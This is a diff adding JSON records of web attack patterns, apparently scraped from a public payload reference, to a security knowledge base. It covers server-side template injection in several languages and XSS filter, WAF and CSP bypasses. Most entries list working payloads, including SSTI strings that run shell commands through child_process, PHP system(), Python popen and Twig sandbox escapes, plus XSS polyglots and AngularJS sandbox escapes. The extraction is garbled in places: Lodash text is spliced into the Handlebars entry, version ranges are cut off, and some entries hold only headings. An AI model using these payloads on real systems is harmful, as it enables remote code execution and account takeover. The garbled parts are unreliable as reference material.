+    "description": "> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Elixir, SSTI can occur when using templating engines like EEx (Embedded Elixir), especially when user input is incorporated into templates without proper sanitization or validation. - [Templating Libraries](#templating-libraries) - [Universal Payloads](#universal-payloads) - [EEx - Basic injections](#eex---basic-injections)",
+    "techniques": [
+      "[Official website](https://hexdocs.pm/eex/1.19.5/EEx.html)",
+      "> EEx stands for Embedded Elixir."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-64",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Server Side Template Injection - Java",
+    "description": "> Server-Side Template Injection (SSTI)  is a security vulnerability that occurs when user input is embedded into server-side templates in an unsafe manner, allowing attackers to inject and execute arbitrary code. In Java, SSTI can be particularly dangerous due to the power and flexibility of Java-based templating engines such as JSP (JavaServer Pages), Thymeleaf, and FreeMarker. - [Templating Libraries](#templating-libraries) - [Java EL - Basic Injection](#java-el---basic-injection) - [Java EL - Code Execution](#java-el---code-execution)",
+    "techniques": [
+      "Default: `${3*3}`",
+      "Legacy: `#{3*3}`",
+      "Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)",
+      "Method using `java.lang.Runtime` #1 - accessed with JavaClass",
+      "Method using `java.lang.Runtime` #2",
+      "Method using `java.lang.Runtime` #3 - accessed with `invoke`",
+      "Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`",
+      "Method using `java.lang.ProcessBuilder`",
+      "Error-Based payload:",
+      "Boolean-Based payload:",
+      "Time-Based payload:",
+      "[Official website](https://freemarker.apache.org/)",
+      "> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data.",
+      "You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)",
+      "The template can be :",
+      "- Default: `${3*3}`",
+      "- Legacy: `#{3*3}`",
+      "- Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)",
+      "If you wanted a string that represents the string: \"id\", you could use the payload: `${9?lower_abc+4?lower_abc)}`.",
+      "Chaining `lower_abc` to perform code execution (command: `id`):"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-65",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Server Side Template Injection - JavaScript",
+    "description": "> Server-Side Template Injection (SSTI)  occurs when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In the context of JavaScript, SSTI vulnerabilities can arise when using server-side templating engines like Handlebars, EJS, or Pug, where user input is integrated into templates without adequate sanitization. - [Templating Libraries](#templating-libraries) - [Universal Payloads](#universal-payloads) - [Handlebars - Basic Injection](#handlebars---basic-injection)",
+    "techniques": [
+      "`>= 4.1.0`, `= 4.0.0`, ` A modern JavaScript utility library delivering modularity, performance & extras.",
+      "string: The template string.",
+      "options.interpolate: It is a regular expression that specifies the HTML *interpolate* delimiter.",
+      "options.evaluate: It is a regular expression that specifies the HTML *evaluate* delimiter.",
+      "options.escape: It is a regular expression that specifies the HTML *escape* delimiter.",
+      "var x = root.process",
+      "x = x.mainModule.require",
+      "x = x('child_process')",
+      "global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()",
+      "global.process.mainModule.require(\"Y:/A:/\"+global.process.mainModule.require(\"child_process\").execSync(\"id\").toString())",
+      "\"\"[\"x\"][global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()]",
+      "[\"\"][0 + !(global.process.mainModule.require(\"child_process\").spawnSync(\"id\", options={shell:true}).status===0)][\"length\"]",
+      "global.process.mainModule.require(\"child_process\").execSync(\"id && sleep 5\").toString()",
+      "This payload only work in handlebars versions, fixed in [GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6):",
+      "- `>= 4.1.0`, `= 4.0.0`, ` A modern JavaScript utility library delivering modularity, performance & extras.",
+      "How to create a template:",
+      "- **string:** The template string.",
+      "- **options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.",
+      "- **options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.",
+      "- **options.escape:** It is a regular expression that specifies the HTML *escape* delimiter."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-66",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Server Side Template Injection - PHP",
+    "description": "> Server-Side Template Injection (SSTI)  is a vulnerability that occurs when an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary commands on the server. In PHP, SSTI can arise when user input is embedded within templates rendered by templating engines like Smarty, Twig, or even within plain PHP templates, without proper sanitization or validation. - [Templating Libraries](#templating-libraries) - [Universal Payloads](#universal-payloads)",
+    "techniques": [
+      "shell_exec('id')",
+      "system('id')",
+      "ini_set(\"error_reporting\", \"1\") // Enable verbose fatal errors for Error-Based",
+      "call_user_func(join(\"\", [\"xx\", shell_exec('id')]))",
+      "1 / (pclose(popen(\"id\", \"wb\")) == 0)",
+      "shell_exec('id && sleep 5')",
+      "system('id && sleep 5')",
+      "{$smarty.version}",
+      "{php}echo `id`;{/php} //deprecated in smarty v3",
+      "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"\",self::clearConfig())}",
+      "{system('ls')} // compatible v3, deprecated in v5",
+      "{system('cat index.php')} // compatible v3, deprecated in v5",
+      "would result in 49",
+      "$output = $twig > render (",
+      "'Dear' . $_GET['custom_greeting'],",
+      "array(\"first_name\" => $user.first_name)",
+      "\"Dear {first_name}\",",
+      "{% for a in [\"error_reporting\", \"1\"]|sort(\"ini_set\") %}{% endfor %} // Enable verbose error output for Error-Based",
+      "{%include [\"Y:/A:/\", _self.env.getFilter(\"id\")]|join%} // Error-Based RCE =1.41, >=2.10, >=3.0",
+      "{% set a = [\"error_reporting\", \"1\"]|sort(\"ini_set\") %}{% set b = [\"ob_start\", \"call_user_func\"]|sort(\"call_user_func\") %}{% set a = [\"ob_end_flush\", []]|sort(\"call_user_func_array\")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-67",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Server Side Template Injection - Python",
+    "description": "> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious input into a server-side template, causing arbitrary code execution on the server. In Python, SSTI can occur when using templating engines such as Jinja2, Mako, or Django templates, where user input is included in templates without proper sanitization. - [Templating Libraries](#templating-libraries) - [Universal Payloads](#universal-payloads) - [Django - Basic Injection](#django---basic-injection)",
+    "techniques": [
+      "__include__(\"os\").popen(\"id\").read() # Rendered RCE",
+      "getattr(\"\", \"x\" + __include__(\"os\").popen(\"id\").read()) # Error-Based RCE",
+      "1 / (__include__(\"os\").popen(\"id\")._proc.wait() == 0) # Boolean-Based RCE",
+      "__include__(\"os\").popen(\"id && sleep 5\").read() # Time-Based RCE",
+      "{% csrf_token %} # Causes error with Jinja2",
+      "ih0vrd121r # Burp Payload -> ih0vr1097d121r",
+      "{% debug %}",
+      "{% include 'admin/base.html' %}",
+      "[Official website](https://jinja.palletsprojects.com/)",
+      "> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.",
+      "Jinja2 is used by Python Web Frameworks such as Django or Flask.",
+      "The above injections have been tested on a Flask application.",
+      "If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.",
+      "Source: [jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-68",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Server Side Template Injection - Ruby",
+    "description": "> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when user input is incorporated into templates without proper sanitization or validation. - [Templating Libraries](#templating-libraries) - [Universal Payloads](#universal-payloads) - [Ruby - Basic injections](#ruby---basic-injections)",
+    "techniques": [
+      "**ERB**:",
+      "**Slim**:",
+      "Execute code using SSTI for **Erb**,**Erubi**,**Erubis** engine.",
+      "Execute code using SSTI for **Slim** engine."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "xss-69",
+    "type": "ExploitPattern",
+    "category": "XSS",
+    "title": "XSS Filter Bypass",
+    "description": "- [Bypass Case Sensitive](#bypass-case-sensitive) - [Bypass Tag Blacklist](#bypass-tag-blacklist) - [Bypass Word Blacklist with Code Evaluation](#bypass-word-blacklist-with-code-evaluation) - [Bypass with Incomplete HTML Tag](#bypass-with-incomplete-html-tag) - [Bypass Quotes for String](#bypass-quotes-for-string) - [Bypass Quotes in Script Tag](#bypass-quotes-in-script-tag) - [Bypass Quotes in Mousedown Event](#bypass-quotes-in-mousedown-event) - [Bypass Dot Filter](#bypass-dot-filter) - [Bypass Parenthesis for String](#bypass-parenthesis-for-string)",
+    "techniques": [
+      "From @garethheyes",
+      "From @terjanq",
+      "From @cgvwzq",
+      "Use less known tag",
+      "Bypass onxxx= filter with a null byte/vertical tab/Carriage Return/Line Feed",
+      "Bypass onxxx= filter with a '/'",
+      "Bypass space filter with \"/\"",
+      "Bypass space filter with `0x0c/^L` or `0x0d/^M` or `0x0a/^J` or `0x09/^I`",
+      "alert(1)",
+      "alert('XSS')",
+      "eval('ale'+'rt(0)');",
+      "Function(\"ale\"+\"rt(1)\")();",
+      "new Function`al\\ert\\`6\\``;",
+      "setTimeout('ale'+'rt(2)');",
+      "setInterval('ale'+'rt(10)');",
+      "Set.constructor('ale'+'rt(13)')();",
+      "Set.constructor`al\\x65rt\\x2814\\x29",
+      "Works on IE/Firefox/Chrome/Safari",
+      "You can bypass a single quote with &#39; in an on mousedown event handler",
+      "Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777`"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "xss"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "xss-70",
+    "type": "ExploitPattern",
+    "category": "XSS",
+    "title": "Polyglot XSS",
+    "description": "A polyglot XSS is a type of cross-site scripting (XSS) payload designed to work across multiple contexts within a web application, such as HTML, JavaScript, and attributes. It exploits the application’s inability to properly sanitize input in different parsing scenarios. jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//\\x3csVg/\\x3e \">>\" >prompt(1)@gmail.com'-->\" >alert(1)\">'\"> * Polyglot XSS - Mathias Karlsson \" onclick=alert(1)// */ alert(1)// ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- >\">'>alert(String.fromCharCode(88,83,83))",
+    "techniques": [
+      "Polyglot XSS - 0xsobky",
+      "Polyglot XSS - Ashar Javed",
+      "Polyglot XSS - Mathias Karlsson",
+      "Polyglot XSS - Rsnake",
+      "Polyglot XSS - Daniel Miessler",
+      "Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)",
+      "Polyglot XSS - from [brutelogic](https://brutelogic.com.br/blog/building-xss-polyglots/)",
+      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//\\x3csVg/\\x3e",
+      "\">>\" >prompt(1)@gmail.com'-->\" >alert(1)\">'\">",
+      "\" onclick=alert(1)// */ alert(1)//",
+      "';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- >\">'>alert(String.fromCharCode(88,83,83))",
+      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->\">'>alert(String.fromCharCode(88,83,83))",
+      "“ onclick=alert(1)// */ alert(1)//",
+      "'\">>\">prompt(1)@gmail.com'-->\">alert(1)\">'\">",
+      "javascript://'/-->*/alert()/*",
+      "javascript://-->\"/*/a",
+      "javascript://\"/*//",
+      "javascript://-->*/alert()/*",
+      "javascript://'//\" -->*/alert()/*",
+      "javascript://*/alert()/*"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "xss"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "xss-71",
+    "type": "ExploitPattern",
+    "category": "XSS",
+    "title": "Common WAF Bypass",
+    "description": "> WAFs are designed to filter out malicious content by inspecting incoming and outgoing traffic for patterns indicative of attacks. Despite their sophistication, WAFs often struggle to keep up with the diverse methods attackers use to obfuscate and modify their payloads to circumvent detection. * [Chrome Auditor](#chrome-auditor) * [Incapsula WAF](#incapsula-waf) * [WordFence WAF](#wordfence-waf) * [Fortiweb WAF](#fortiweb-waf) * 25st January 2021 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+    "techniques": [
+      "25st January 2021 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+      "21st April 2020 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+      "22nd August 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+      "3rd June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+      "22nd March 2019 - @RakeshMane10",
+      "9th August 2018",
+      "11th May 2019 - [@daveysec](https://twitter.com/daveysec/status/1126999990658670593)",
+      "8th March 2018 - [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)",
+      "11th September 2018 - [@c0d3G33k](https://twitter.com/c0d3G33k)",
+      "18th June 2018 - [@zseano](https://twitter.com/zseano)",
+      "28th October 2018 - [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480)",
+      "12th September 2018 - [@brutelogic](https://twitter.com/brutelogic)",
+      "9th July 2019 - [@rezaduty](https://twitter.com/rezaduty)",
+      "* 21st April 2020 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+      "* 22nd August 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+      "* 3rd June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+      "* 22nd March 2019 - @RakeshMane10",
+      "NOTE: Chrome Auditor is deprecated and removed on latest version of Chrome and Chromium Browser.",
+      "* 9th August 2018",
+      "* 11th May 2019 - [@daveysec](https://twitter.com/daveysec/status/1126999990658670593)"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "xss"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "xss-72",
+    "type": "ExploitPattern",
+    "category": "XSS",
+    "title": "CSP Bypass",
+    "description": "> A Content Security Policy (CSP) is a security feature that helps prevent cross-site scripting (XSS), data injection attacks, and other code-injection vulnerabilities in web applications. It works by specifying which sources of content (like scripts, styles, images, etc.) are allowed to load and execute on a webpage. - [Bypass CSP using JSONP](#bypass-csp-using-jsonp) - [Bypass CSP default-src](#bypass-csp-default-src) - [Bypass CSP inline eval](#bypass-csp-inline-eval) - [Bypass CSP unsafe-inline](#bypass-csp-unsafe-inline)",
+    "techniques": [
+      "CSP: `script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';`",
+      "Google Search: `//google.com/complete/search?client=chrome&jsonp=alert(1);`",
+      "Google Account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`",
+      "Google Translate: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`",
+      "Youtube: `https://www.youtube.com/oembed?callback=alert;`",
+      "CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`,",
+      "CSP `inline` or `eval`",
+      "CSP like `script-src self`",
+      "CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).",
+      "CSP: `script-src https://google.com 'unsafe-inline';`",
+      "CSP like `script-src 'nonce-RANDOM_NONCE'`",
+      "Imported JS file with a relative link: ``",
+      "Inject a base tag.",
+      "Host your custom js file at the same path that one of the website's script.",
+      "CSP sent by PHP `header()` function",
+      "1000 $_GET parameters",
+      "1000 $_POST parameters",
+      "Warning: `PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown on line 0`",
+      "Warning: `Cannot modify header information - headers already sent in /var/www/html/index.php on line 2`",
+      "**Requirements**:"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "xss"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "xss-73",
+    "type": "ExploitPattern",
+    "category": "XSS",
+    "title": "XSS in Angular and AngularJS",
+    "description": "* [Client Side Template Injection](#client-side-template-injection) * [Stored/Reflected XSS](#storedreflected-xss) * [Advanced Bypassing XSS](#advanced-bypassing-xss) * [Automatic Sanitization](#automatic-sanitization) The following payloads are based on Client Side Template Injection. `ng-app` directive must be present in a root element to allow the client-side injection (cf. [AngularJS: API: ngApp](https://docs.angularjs.org/api/ng/directive/ngApp)). > AngularJS as of version 1.6 have removed the sandbox altogether",
+    "techniques": [
+      "bypassSecurityTrustHtml",
+      "bypassSecurityTrustScript",
+      "bypassSecurityTrustStyle",
+      "bypassSecurityTrustUrl",
+      "bypassSecurityTrustResourceUrl",
+      "c=''.sub.call;b=''.sub.bind;a=''.sub.apply;",
+      "c.$apply=$apply;c.$eval=b;op=$root.$$phase;",
+      "$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;",
+      "C=c.$apply(c);$root.$$phase=op;$root.$digest=od;",
+      "B=C(b,c,b);$evalAsync(\"",
+      "astNode=pop();astNode.type='UnaryExpression';",
+      "astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';",
+      "astNode.argument={type:'Identifier',name:'foo'};",
+      "m1=B($$asyncQueue.pop().expression,null,$root);",
+      "m2=B(C,null,m1);[].push.apply=m2;a=''.sub;",
+      "$eval('a(b.c)');[].push.apply=a;",
+      "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
+      "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
+      "'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;",
+      "$eval('x=alert(1)//');"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "xss"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-74",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Books",
+    "description": "> Grab a book and relax. Some of the best books in the industry. - [Advanced Penetration Testing: Hacking the World's Most Secure Networks by Wil Allsopp (2017)](https://www.goodreads.com/book/show/32027337-advanced-penetration-testing) - [Android Hacker's Handbook by Joshua J. Drake et al. (2014)](http://www.wiley.com/WileyCDA/WileyTitle/productCd-111860864X.html) - [iOS Hacker's Handbook by Charlie Miller et al. (2012)](http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118204123.html) - [The Browser Hacker's Handbook by Wade Alcorn et al. (2014)](http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118662091.html)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-75",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Twitter",
+    "description": "> Twitter is very common in the InfoSec area. Many advices and tips on bug hunting or CTF games are posted every day. It is worth following the feeds of some successful security researchers and hackers. - [@0xReconless - Security research, blogs, and videos by filedescriptor, ngalongc & EdOverflow](https://twitter.com/0xReconless) - [@bugcrowd - Another american bug bounty platform](https://twitter.com/Bugcrowd) - [@codingo_ - Global Head of Security Ops and Researcher Enablement bugcrowd, Maintainer of some great pentesting tools like NoSQLMap or VHostScan](https://twitter.com/codingo_)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-76",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Youtube",
+    "description": "> Discover the best YouTube channels, must-watch conference talks, and handpicked videos on information security. - [0xdf](https://www.youtube.com/@0xdf) - [Assetnote - Surfacing Security Podcast](https://www.youtube.com/@assetnote2016) - [Bug Bounty Reports Explained](https://www.youtube.com/@BugBountyReportsExplained) - [Codingo](https://www.youtube.com/@codingo) - [Critical Thinking - Bug Bounty Podcast](https://www.youtube.com/@criticalthinkingpodcast) - [Embrace The Red - wunderwuzzi](https://www.youtube.com/@embracethered)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  }
+]
